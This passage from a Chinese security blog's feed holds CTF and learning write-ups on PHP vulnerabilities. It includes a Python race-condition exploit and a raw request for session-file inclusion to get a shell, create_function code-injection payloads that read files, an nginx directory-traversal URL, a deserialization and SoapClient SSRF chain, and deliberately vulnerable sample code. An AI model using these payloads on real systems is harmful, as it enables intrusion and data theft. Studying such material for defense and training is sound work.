'.basename(self::$refclass->getFileName()).PHP_EOL.PHP_EOL;    }    // 读取类接口    public static function getInterfaces(){        echo '<strong>INTERFACES INFO</strong>'.PHP_EOL;        $interfaces = self::$refclass->getInterfaces();        if($interfaces){            foreach($interfaces as $interface){                echo 'interface name: '.$interface->getName().PHP_EOL;            }        }    }    // 读取类属性    public static function getProperties(){        echo '<strong>PROPERTIES INFO</strong>'.PHP_EOL;        $properties = self::$refclass->getProperties();        if($properties){            foreach($properties as $property){                echo 'property name: '.$property->getName().PHP_EOL;                echo 'property modifier: '.self::getModifier($property).PHP_EOL;                echo 'property comments: '.self::formatComment($property->getDocComment()).PHP_EOL.PHP_EOL;            }        }    }    // 读取类方法    public static function getMethods(){        echo '<strong>METHODS INFO</strong>'.PHP_EOL;        $methods = self::$refclass->getMethods();        if($methods){            foreach($methods as $method){                echo 'method name: '.$method->getName().PHP_EOL;                echo 'method modifier: '.self::getModifier($method).PHP_EOL;                echo 'method params num: '.$method->getNumberOfParameters().PHP_EOL;                $params = $method->getParameters();                if($params){                    foreach($params as $param){                        echo 'param name:'.$param->getName().PHP_EOL;                    }                }                echo 'method comments: '.self::formatComment($method->getDocComment()).PHP_EOL.PHP_EOL;            }        }    }    // 获取修饰符    private static function getModifier($o){        // public        if($o->isPublic()){            return 'public';        }        // protected        if($o->isProtected()){            return 'protected';        }        // private        if($o->isPrivate()){            return 'private';        }        return '';    }    // 格式化注释内容    private static function formatComment($comment){        $doc = explode(PHP_EOL, $comment);        return isset($doc[1])? trim(str_replace('*','',$doc[1])) : '';    }}?>漏洞demo:Shopware 5.3.3 ![image_1d3jmmolk14j8n3nrb91kkdqos9.png-228.1kB][1]该函数的两个方法都可控，创建的反射类，可以为php的内置类`SimpleXMLElement`从而导致盲打xxe-->]]></content>
    
    <summary type="html">
    
      &lt;p&gt;梳理和总结了一下最近学的东西~&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>文件包含小结</title>
    <link href="http://0day.design/2019/03/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8F%E7%BB%93/"/>
    <id>http://0day.design/2019/03/05/文件包含小结/</id>
    <published>2019-03-05T08:22:00.000Z</published>
    <updated>2019-03-05T08:28:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>梳理和总结了一下最近学的东西~<br><a id="more"></a></p><h2 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h2><p>p师傅小密圈里学到了一种文件包含getshell的利用思路：文件包含漏洞在找不到可包含的文件，可以包含session文件从而getshell。</p><blockquote><p>默认情况下，session.use_strict_mode值是0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=zsxqzsxq，PHP将会在服务器上创建一个文件：/tmp/sess_zsxqzsxq</p></blockquote><p>在phpmyadmin 4.8.1 文件包含漏洞（CVE-2018-12613）中利用了这个思路从文件包含到getshell</p><p>该技巧利用条件：服务器上需要已经初始化Session</p><p>通用的初始化方法：<code>session_start()</code></p><p>p师傅在小密圈解读phpinfo学到了其他的初始化session思路：<a href="https://t.zsxq.com/2nQbAYr" target="_blank" rel="noopener">https://t.zsxq.com/2nQbAYr</a></p><p>配置项：<code>session.auto_start</code><br>如果开启这个选项，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，也是通常情况下，这个选项都是关闭的。</p><p>配置项：<code>session.upload_progress</code><br>最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中（包含用户可控的值），即使此时用户没有初始化Session，PHP也会自动初始化Session。默认情况下session.upload_progress.enabled是为On的。</p><p>所以可以利用这点我们可以构造如下数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 436</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryetzSsuG4Wg73Ob9R</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.9d Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line">Cookie: PHPSESSID=passer6y</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryetzSsuG4Wg73Ob9R</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">    </span><br><span class="line">aaaa</span><br><span class="line">------WebKitFormBoundaryetzSsuG4Wg73Ob9R</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;flag.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">    </span><br><span class="line">flag</span><br><span class="line">------WebKitFormBoundaryetzSsuG4Wg73Ob9R</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFormBoundaryetzSsuG4Wg73Ob9R--</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/i2vau0bbcf22n3abpv3wnfoj/image_1d4mqlr5rb3f11ig18kp1m5g1bm816.png" alt="image_1d4mqlr5rb3f11ig18kp1m5g1bm816.png-399.7kB"></p><p>从上图看到，我们创建了一个名为<code>sess_passer6y</code>,但是文件内容大小是0，因为上传结束后，这个Session将会被自动清除（由session.upload_progress.cleanup定义），我们只需要条件竞争，赶在文件被清除前利用即可。</p><p>所以，只要存在一个文件包含漏洞,我们就可以利用这些默认的特性来Getshell：</p><p>复现环境：php 7.0.21</p><p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   if (isset($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">       include &apos;./&apos; . $_GET[&apos;file&apos;];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>构造以下两个数据包，发送到爆破模块，null payload爆破即可<br><img src="http://static.zybuluo.com/Passer6y/2kbm8r7jv56xz9om6t5az0t9/image_1d4mr14ca15lq1aug8q5d7b25e1j.png" alt="image_1d4mr14ca15lq1aug8q5d7b25e1j.png-44.3kB"><br><img src="http://static.zybuluo.com/Passer6y/abkvqeu0lmk56r2ic6dt3vah/image_1d4mr1jv5brknqsbkm8lf53h2g.png" alt="image_1d4mr1jv5brknqsbkm8lf53h2g.png-83kB"></p><blockquote><p>不可取.. 这种方法会造成大量session临时文件</p></blockquote><p>还是用p师傅给的exp吧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = &apos;passer6y&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def t1(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&apos;a&apos; * 1024 * 50)</span><br><span class="line">        response = session.post(</span><br><span class="line">            &apos;http://localhost/test.php&apos;,</span><br><span class="line">            data=&#123;&apos;PHP_SESSION_UPLOAD_PROGRESS&apos;: &apos;&lt;?=phpinfo()?&gt;&apos;&#125;,</span><br><span class="line">            files=&#123;&apos;file&apos;: (&apos;a.txt&apos;, f)&#125;,</span><br><span class="line">            cookies=&#123;&apos;PHPSESSID&apos;: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def t2(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.get(f&apos;http://127.0.0.1/index.php?file=../../../../../../../../tmp/sess_&#123;sessid&#125;&apos;)</span><br><span class="line">        print(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 = threading.Thread(target=t1, args=(session, ))</span><br><span class="line">    t1.daemon = True</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    t2(session)</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/b1rxjcmh14efk7e300ohpf6b/image_1d4msr4rcsshjqsoaj16bv1iao9.png" alt="image_1d4msr4rcsshjqsoaj16bv1iao9.png-256.8kB"></p><p>参考：<br><a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog" target="_blank" rel="noopener">phpmyadmin 4.8.1 文件包含漏洞</a></p><h2 id="配合phpinfo-包含上传临时文件"><a href="#配合phpinfo-包含上传临时文件" class="headerlink" title="配合phpinfo,包含上传临时文件"></a>配合phpinfo,包含上传临时文件</h2><p>参考笔记： <a href="https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f" target="_blank" rel="noopener">https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f</a></p><h2 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h2><p>参考笔记： <a href="https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f" target="_blank" rel="noopener">https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f</a></p><h2 id="自包含漏洞"><a href="#自包含漏洞" class="headerlink" title="自包含漏洞"></a>自包含漏洞</h2><p>参考笔记： <a href="https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f" target="_blank" rel="noopener">https://app.yinxiang.com/shard/s17/sh/e1cdae4e-d4c3-4595-8bfb-03eff04c4cdb/6b917c87b16133fbcbd60070b579ef2f</a></p><p>参考文章：<a href="https://www.anquanke.com/post/id/153376" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153376</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;梳理和总结了一下最近学的东西~&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking Write Up</title>
    <link href="http://0day.design/2019/03/03/Code-Breaking%20Write%20Up/"/>
    <id>http://0day.design/2019/03/03/Code-Breaking Write Up/</id>
    <published>2019-03-02T16:11:00.000Z</published>
    <updated>2019-04-13T09:54:49.808Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="function"><a href="#function" class="headerlink" title="function"></a>function</h2><p>source:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">//D 如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class="line">//i 不区分(ignore)大小写；</span><br><span class="line">//s 特殊字符圆点 . 中包含换行符</span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;  </span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以使用<code>create_function()</code>,用法：<a href="http://php.net/manual/zh/function.create-function.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.create-function.php</a></p><p>即第一个为参数新建函数的参数，第二个参数为代码。<br><img src="http://static.zybuluo.com/Passer6y/snzalqfzq6nkksznj1br8yf1/image_1d4vegnss6en1uup1mm61c6a1db99.png" alt="image_1d4vegnss6en1uup1mm61c6a1db99.png-10.6kB"></p><p><code>create_function(&#39;&#39;,&#39;$GET_[&#39;fname&#39;]&#39;)</code></p><p>等价于</p><p><code>function f() { $GET_[&#39;fname&#39;]; }</code></p><p>于是传入参数为 1;}phpinfo();/*即</p><p><code>function f(){1;}phpinfo();/*}</code></p><p>这里<code>$action</code>还需要绕一下正则，使用<code>\</code>绕过，<code>\func()</code>表示调用全局空间的函数，如果直接写函数名fun()调用，调用的时候其实相当于写了一个相对路径，而用\func()，即使用的是绝对路径。</p><p>拿到phpinfo():</p><p><code>?action=\create_function&amp;arg=1;}phpinfo();/*</code></p><p>列文件：<code>?action=\create_function&amp;arg=1;}var_dump(scandir(&#39;/var/www&#39;));/*</code></p><p><img src="http://static.zybuluo.com/Passer6y/1u3vdsbqxae5epgxatr4hzql/image_1d4vigcfa8v11qu1q2386gea69.png" alt="image_1d4vigcfa8v11qu1q2386gea69.png-128.6kB"></p><p>读flag：</p><p><code>action=\create_function&amp;arg=1;}var_dump(file_get_contents(&quot;../flag_h0w2execute_arb1trary_c0de&quot;));/*</code></p><p><img src="http://static.zybuluo.com/Passer6y/nfv15smwtoeb5mwbz3v9tfnx/image_1d4vikbvq1e371d0a14bl1bue1k8m.png" alt="image_1d4vikbvq1e371d0a14bl1bue1k8m.png-113.4kB"></p><p>持续更新ing</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0day.design/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://0day.design/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>35C3-POST WriteUp</title>
    <link href="http://0day.design/2019/02/18/35C3-POST%20WriteUp/"/>
    <id>http://0day.design/2019/02/18/35C3-POST WriteUp/</id>
    <published>2019-02-18T02:00:00.000Z</published>
    <updated>2019-04-13T09:54:40.541Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>题目&amp;wp链接：<br><a href="https://github.com/eboda/35c3/tree/master/post" target="_blank" rel="noopener">https://github.com/eboda/35c3/tree/master/post</a></p><blockquote><p>35C3-POST<br>hint: flag is in db<br>Hint2: the lovely XSS is part of the beautiful design and insignificant for the challenge<br>Hint3: You probably want to get the source code, luckily for you it’s rather hard to configure nginx correctly.</p></blockquote><p>功能点很简单，注册，登录，上传文件，评论。</p><p>测试了<code>&lt; &gt;</code>被实体编码，上传php文件不解析。</p><p>提示xss无用，nginx配置有问题，在<a href="https://github.com/vulhub/vulhub/tree/master/nginx/insecure-configuration" target="_blank" rel="noopener">Vulhub</a>中提到了常见的nginx配置问题。</p><p>结合提示中的源码泄露，这里尝试nginx的alias配置不当导致目录穿越漏洞。<br>整个过程就一个<code>uploads</code>目录,构造payload:<code>http://50.3.232.201:8000/uploads../</code></p><p>得到一个default.backup:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    access_log  /var/log/nginx/example.log;</span><br><span class="line"></span><br><span class="line">    server_name localhost;</span><br><span class="line"></span><br><span class="line">    root /var/www/html;</span><br><span class="line"></span><br><span class="line">    location /uploads &#123;</span><br><span class="line">        autoindex on;       </span><br><span class="line">        alias /var/www/uploads/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        alias /var/www/html/;</span><br><span class="line">        index index.php;</span><br><span class="line"></span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">            include snippets/fastcgi-php.conf;</span><br><span class="line">            fastcgi_pass unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /inc/ &#123;</span><br><span class="line">        deny all;   # 禁止直接访问</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 127.0.0.1:8080;</span><br><span class="line">    access_log /var/log/nginx/proxy.log;</span><br><span class="line"></span><br><span class="line">    if ( $request_method !~ ^(GET)$ ) &#123;</span><br><span class="line">        return 405;</span><br><span class="line">    &#125;</span><br><span class="line">    root /var/www/miniProxy;</span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.php;</span><br><span class="line"></span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">            include snippets/fastcgi-php.conf;</span><br><span class="line">            fastcgi_pass unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>说明8080端口还有另一个服务，即在<code>/var/www/miniProxy</code>目录下，直接访问<code>http://50.3.232.201:8000/uploads../miniProxy/</code>可以直接下载php源码，不会解析，这个页面的功能大概就是web的proxy。</p><p>此外，通过目录穿越可以下载到全部php源码。</p><p>源码基本浏览了一遍，加上提示，我们要拿到数据库里面的flag，在<code>db.php</code>的38行出中有一处反序列化操作<code>unserialize()</code>：<br><img src="http://static.zybuluo.com/Passer6y/bzabr45m9lyb32prspqhl77z/image_1d3t44d2d1e1j421ciln9ni5i9.png" alt="image_1d3t44d2d1e1j421ciln9ni5i9.png-69.1kB"><br>而该函数的功能是将从数据库取出的数据进行反序列化操作，<code>db.php</code>的52行：<br><img src="http://static.zybuluo.com/Passer6y/ksy2npl6oqllpfzdamcqd51n/image_1d3t460c91rgpvdv10sj1ne1ucem.png" alt="image_1d3t460c91rgpvdv10sj1ne1ucem.png-69.8kB"></p><p>所以我们要想控制这个<code>unserialize()</code>函数，就得先往数据库里面插入我们的数据，55行:<br><img src="http://static.zybuluo.com/Passer6y/ht9ah6rlr6681qrb2ghpptvo/image_1d3t487qa1d4ci1ks04jclcmn13.png" alt="image_1d3t487qa1d4ci1ks04jclcmn13.png-65.8kB"></p><p>全局搜索<code>insert</code>操作，共两处，一处注册，一处提交post数据。<br><img src="http://static.zybuluo.com/Passer6y/z9vn9u8gantbxgea3l4hfxog/image_1d3t49dromul7auqt8ei41fml1g.png" alt="image_1d3t49dromul7auqt8ei41fml1g.png-160.2kB"></p><p>post.php的41行：<br><img src="http://static.zybuluo.com/Passer6y/ke6jxxnlz5gbp7ntct7lngwo/image_1d3tov9ne1fug19ol11p153l3ut3d.png" alt="image_1d3tov9ne1fug19ol11p153l3ut3d.png-104.1kB"></p><p>全局搜索<code>save()</code>函数，在default.php的19行：<br><img src="http://static.zybuluo.com/Passer6y/axo7uk32xb4noh3o4458c887/image_1d3tp1kep10hurlojai2h0bo647.png" alt="image_1d3tp1kep10hurlojai2h0bo647.png-173.7kB"></p><p><code>save()</code>函数中<code>insert()</code>，在db.php中的55行<br><img src="http://static.zybuluo.com/Passer6y/a8cuigf87nv5u2iaqrqpk5to/image_1d3tv92gb1irns0iitmqo8125i9.png" alt="image_1d3tv92gb1irns0iitmqo8125i9.png-84.6kB"></p><p>再跟进<code>DB::prepare_params()</code>，db.php的18行:<br><img src="http://static.zybuluo.com/Passer6y/aib72ockuffgvylmvficnimr/image_1d3tvh90e6peueunqc1n1e1438m.png" alt="image_1d3tvh90e6peueunqc1n1e1438m.png-80.5kB"></p><p>这里中途对<code>array_map()</code>没理解好，卡了很久:<a href="http://php.net/manual/en/function.array-map.php" target="_blank" rel="noopener">http://php.net/manual/en/function.array-map.php</a></p><p>到这里，我们要传入一个<code>$serializedobject$</code>开头的字符串，才能使得查库操作时触发我们的<code>unserialize()</code>，但insert的时候过滤了这个字符串前缀，在官方的wp中提到，我们可以使用全角符号的unicode字符，mssql会自动转换，以<code>$</code>符号存入数据库中。<br><img src="http://static.zybuluo.com/Passer6y/j1hvx971rde1dbwoblr0wjvv/image_1d3u04oab2oc5ol1b0fl9pouk13.png" alt="image_1d3u04oab2oc5ol1b0fl9pouk13.png-80.9kB"></p><p>这里<code>0xEF 0xBC 0x84</code>会被mssql存储为<code>$</code></p><p>下面构造反序列化的攻击链：<br>首先<code>default.php</code> 73行<br><img src="http://static.zybuluo.com/Passer6y/xo09c47cfv0aj4oyh1e8wm8u/image_1d3u3btl0os41sob1kk71qac11o0p.png" alt="image_1d3u3btl0os41sob1kk71qac11o0p.png-72.7kB"><br>调用了post.php的63行,使用了query函数查询<br><img src="http://static.zybuluo.com/Passer6y/tfmczi6one9tbtc0mweopsxv/image_1d3u3dhltqr01jm413e2bht1ud416.png" alt="image_1d3u3dhltqr01jm413e2bht1ud416.png-118kB"></p><p>同时在<code>post.php</code>中的Attachment类<br><img src="http://static.zybuluo.com/Passer6y/2xkzrvbaqfb252b59ms24acc/image_1d3u3fjs09i1ri1c3j1a1d17la1j.png" alt="image_1d3u3fjs09i1ri1c3j1a1d17la1j.png-149.5kB"></p><p>控制<code>$za</code>属性传入soapClient类，使之在上图19行调用了<code>open()</code>方法，因为不存在，所以触发soapClient的<code>__call</code>方法(这里猜想有soap服务，另一个8080端口的服务暗示我们了ssrf，加上这里unserialize的利用功能点少)</p><p>payload:<br><img src="http://static.zybuluo.com/Passer6y/7s05xyw175lfsi3mxj2xcxe1/image_1d3v4ki6415jrro18ek17t11r799.png" alt="image_1d3v4ki6415jrro18ek17t11r799.png-44.6kB"></p><p><code>$</code>用brup的hex修改<br><img src="http://static.zybuluo.com/Passer6y/yyjya2xwgx9b8swvqvmrtehm/image_1d3v4l7rnb98n38c8s1mrj4aqm.png" alt="image_1d3v4l7rnb98n38c8s1mrj4aqm.png-60.4kB"></p><p>8080端口服务只允许get型数据，但是从其服务中来看我们要用post型去打内网数据库，所以这里就利用soapclient的clrf发起get请求，gopher模拟post<br><img src="http://static.zybuluo.com/Passer6y/ukjrueq5jq1z7z2khuh26tsc/image_1d3v5h7ca5q11lktsi8j391akf1g.png" alt="image_1d3v5h7ca5q11lktsi8j391akf1g.png-155.2kB"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0day.design/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://0day.design/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP SECURITY CALENDAR 2017</title>
    <link href="http://0day.design/2019/02/14/PHP%20SECURITY%20CALENDAR%202017/"/>
    <id>http://0day.design/2019/02/14/PHP SECURITY CALENDAR 2017/</id>
    <published>2019-02-14T05:00:00.000Z</published>
    <updated>2019-03-16T16:10:24.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/03/17/5c8d1fb7af458.png" alt="更新图片"></p><a id="more"></a><h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><p>考点：<code>in_array()</code>未配置第三个参数，导致弱类型绕过<br>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Challenge &#123;</span><br><span class="line">  const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;</span><br><span class="line">  private $file;</span><br><span class="line">  private $whitelist;</span><br><span class="line"></span><br><span class="line">  public function __construct($file) &#123;</span><br><span class="line">    $this-&gt;file = $file;</span><br><span class="line">    $this-&gt;whitelist = range(1, 24);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __destruct() &#123;</span><br><span class="line">    if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        $this-&gt;file[&apos;tmp_name&apos;],</span><br><span class="line">        self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = new Challenge($_FILES[&apos;solution&apos;]);</span><br></pre></td></tr></table></figure></p><p>大致的逻辑为上传一个表单<code>name=solution</code>的文件，验证其文件名在<code>range(1,24)</code>的范围，使用的<code>in_array()</code>来进行验证。</p><p>问题就出在<code>in_array()</code>函数：<a href="http://php.net/manual/zh/function.in-array.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.in-array.php</a><br><img src="http://static.zybuluo.com/Passer6y/p1etqbstbr36yu1hzq10hn5h/image_1d3g7p4rh1e9gece235i9s1ogn9.png" alt="image_1d3g7p4rh1e9gece235i9s1ogn9.png-34.1kB"></p><p>文档中写道，如果没有使用第三个参数<code>$strick=true</code>，则使用弱类型比较，即前先进行类型转换再比较。<br>即我们构造一个文件名为<code>1a.php</code>,经过<code>in_array()</code>的类型转换会变成<code>1</code>从而绕过这个限制。</p><p>demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$array = range(1,24);</span><br><span class="line">$file_name = &quot;1a.php&quot;;</span><br><span class="line">if(in_array($file_name, $array))&#123;</span><br><span class="line">    var_dump(in_array($file_name, $array));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/9qelxcadm0ay204ml3poth8y/image_1d3g9a3oi1ci623uipgs7l1oj29.png" alt="image_1d3g9a3oi1ci623uipgs7l1oj29.png-70kB"></p><p>红日安全提供的一道练习题：<a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">https://xz.aliyun.com/t/2451</a><br>这里用<code>make_set</code>函数绕group，然后报错注入。 没过滤sleep，if，mid盲注也行<br><img src="http://static.zybuluo.com/Passer6y/sg0t0txcij3wjnxh0ef5zc41/image_1d3gubp0f1rlvftc19cn10j66b29.png" alt="image_1d3gubp0f1rlvftc19cn10j66b29.png-69.8kB"></p><h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><p>考点：<code>filter_var</code>的url验证绕过<br>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 